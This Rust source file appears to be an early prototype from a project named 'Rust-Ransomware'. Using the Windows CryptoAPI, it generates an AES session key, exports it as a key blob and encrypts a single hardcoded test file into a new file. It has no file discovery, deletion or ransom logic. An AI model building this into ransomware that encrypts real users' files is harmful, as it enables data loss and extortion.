#[cfg(windows)]
extern crate winapi;

mod lib;
use std::ffi::CString;
use std::ptr::null_mut;
use winapi::shared::winerror::NTE_NO_KEY;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileA, ReadFile, WriteFile, OPEN_ALWAYS, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::wincrypt::{
    CryptAcquireContextA, CryptDestroyKey, CryptEncrypt, CryptExportKey, CryptGenKey,
    CryptGetUserKey, CryptReleaseContext, AT_KEYEXCHANGE, CALG_AES_128, CRYPT_EXPORTABLE,
    CRYPT_VERIFYCONTEXT, HCRYPTKEY, HCRYPTPROV, PROV_RSA_AES, SIMPLEBLOB,
};
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_READ_DATA, FILE_SHARE_READ, FILE_WRITE_DATA, HANDLE,
};
fn main() {
    unsafe {
        encrypt(CString::new("C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\yeet.txt").unwrap(),
         CString::new("C:\\Users\\chuon\\OneDrive\\Desktop\\Rust-Ransomware\\testing_ransom\\yeet_encrypted.txt").unwrap());
    }
}

fn encrypt(source_file: CString, dest_file: CString) -> bool {
    unsafe {
        let KEYLENGTH = 0x00800000; // upper 16 bits = 128 bits
        let mut h_source_file: HANDLE = null_mut(); // handle for source file
        let mut h_dest_file: HANDLE = null_mut(); // handle for dest file

        let mut h_key: HCRYPTKEY = 0usize; // key
        let mut h_crypt_prov: HCRYPTPROV = 0usize;
        let mut h_xchg_key = 0usize;
        let mut phProv: usize = 0;

        let mut dw_key_blob_len: u32 = 0;

        h_source_file = CreateFileA(
            source_file.as_ptr(),
            FILE_READ_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_source_file == INVALID_HANDLE_VALUE {
            println!("Create handle for source file fails.");
            println!("Errror code: {}", GetLastError());
            return false;
        } else {
            println!("Create handle for source file sucessfully...");
        }

        h_dest_file = CreateFileA(
            dest_file.as_ptr(),
            FILE_WRITE_DATA,
            FILE_SHARE_READ,
            null_mut(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            null_mut(),
        );

        if h_dest_file == INVALID_HANDLE_VALUE {
            println!("Create handle for destination file fails.");
            println!("Errror code: {}", GetLastError());
            return false;
        } else {
            println!("Create handle for destination file sucessfully...");
        }

        //---------------------------------------------------------------
        // Get the handle to the default provider.

        if CryptAcquireContextA(
            &mut h_crypt_prov,
            null_mut(),
            null_mut(),
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT,
        ) == 0
        {
            println!("Error during CryptAcquireContext!");
            println!("Errror code: {}", GetLastError());
            return false;
        } else {
            println!("A cryptographic provider has been acquired.");
        }

        //---------------------------------------------------------------
        // Create the session key.
        if CryptGenKey(
            h_crypt_prov,
            CALG_AES_128,
            KEYLENGTH | CRYPT_EXPORTABLE,
            &mut h_key,
        ) == 0
        {
            println!("Error during CryptGenKey.");
            return false;
        } else {
            println!("A session key has been created.");
        }

        //-----------------------------------------------------------
        // Get the handle to the exchange public key.

        if CryptGetUserKey(h_crypt_prov, AT_KEYEXCHANGE, &mut h_xchg_key) == 0 {
            println!("Error during CryptGetUserKey.");
            let error = GetLastError();

            if NTE_NO_KEY == error as i32 {
                // No exchange key exists. Try to create one.
                if CryptGenKey(
                    h_crypt_prov,
                    AT_KEYEXCHANGE,
                    CRYPT_EXPORTABLE,
                    &mut h_xchg_key,
                ) == 0
                {
                    println!("Error during CryptGenKey. No key exchange");
                    return false;
                } else {
                    println!("The user public key has been retrieved. ");
                }
            } else {
                println!("Public key exchange might not exist. Error {}", error);
                return false;
            }
        } else {
            println!("The user public key has been retrieved. ");
        }

        //-----------------------------------------------------------
        // Determine size of the key BLOB, and allocate memory.

        if CryptExportKey(
            h_key,
            h_xchg_key,
            SIMPLEBLOB,
            0,
            null_mut(),
            &mut dw_key_blob_len,
        ) == 0
        {
            println!("Error computing BLOB length!");
            return false;
        } else {
            println!("The key BLOB is {} bytes long.", dw_key_blob_len);
        }

        let mut pb_key_blop: Vec<u8> = Vec::with_capacity(dw_key_blob_len as usize);
        for i in 0..dw_key_blob_len {
            pb_key_blop.push(0u8);
        }
        println!("Memory is allocated for the key BLOB.");

        //-----------------------------------------------------------
        // Encrypt and export the session key into a simple key
        // BLOB.
        if CryptExportKey(
            h_key,
            h_xchg_key,
            SIMPLEBLOB,
            0,
            pb_key_blop.as_ptr() as *mut u8,
            &mut dw_key_blob_len,
        ) == 0
        {
            println!("Error during CryptExportKey!");
            return false;
        } else {
            println!("The key has been exported.");
        }

        //-----------------------------------------------------------
        // Release the key exchange key handle.
        if h_xchg_key != 0 {
            if CryptDestroyKey(h_xchg_key) == 0 {
                println!("Error during CryptDestroyKey.");
            }
        }

        //-----------------------------------------------------------
        // Write the size of the key BLOB to the destination file.
        let mut dw_count: u32 = 0;
        if WriteFile(
            h_dest_file,
            pb_key_blop.as_ptr() as *const _,
            dw_key_blob_len,
            &mut dw_count,
            null_mut(),
        ) == 0
        {
            println!("Error writing header.");
            return false;
        } else {
            println!("The key BLOB has been written to the destination file");
        }
        drop(pb_key_blop);

        //---------------------------------------------------------------
        // The session key is now ready. The session key encrypted with the private key
        // has been written to the destination file.

        //---------------------------------------------------------------
        // Determine the number of bytes to encrypt at a time.
        // This must be a multiple of ENCRYPT_BLOCK_SIZE.
        // ENCRYPT_BLOCK_SIZE is set by a #define statement.
        let mut dw_block_len: u32 = 1000 - 1000 % 8;
        let mut dw_buffer_len: u32 = dw_block_len + 8;
        //---------------------------------------------------------------
        // Allocate memory.

        let mut pb_buffer: Vec<u8> = Vec::new();
        for i in 0..dw_buffer_len {
            pb_buffer.push(0u8);
        }
        println!("Memory has been allocated for the buffer.");

        let mut EOF = 0;
        while EOF == 0 {
            if ReadFile(
                h_source_file,
                pb_buffer.as_ptr() as *mut _,
                dw_block_len,
                &mut dw_count,
                null_mut(),
            ) == 0
            {
                println!("Error reading plaintext!");
                return false;
            }

            if dw_count < dw_block_len {
                EOF = 1;
            }

            //-----------------------------------------------------------
            // Encrypt data.
            if CryptEncrypt(
                h_key,
                0,
                EOF,
                0,
                pb_buffer.as_ptr() as *mut u8,
                &mut dw_count,
                dw_buffer_len,
            ) == 0
            {
                println!("Error during CryptEncrypt.");
                return false;
            }
            if WriteFile(
                h_dest_file,
                pb_buffer.as_ptr() as *const _,
                dw_count,
                &mut dw_count,
                null_mut(),
            ) == 0
            {
                println!("Error writing ciphertext.");
            }
        }

        println!("Done encrypting yay!");
        CloseHandle(h_source_file);
        CloseHandle(h_dest_file);
        CryptDestroyKey(h_key);
        CryptReleaseContext(h_crypt_prov, 0);
    }
    true
}
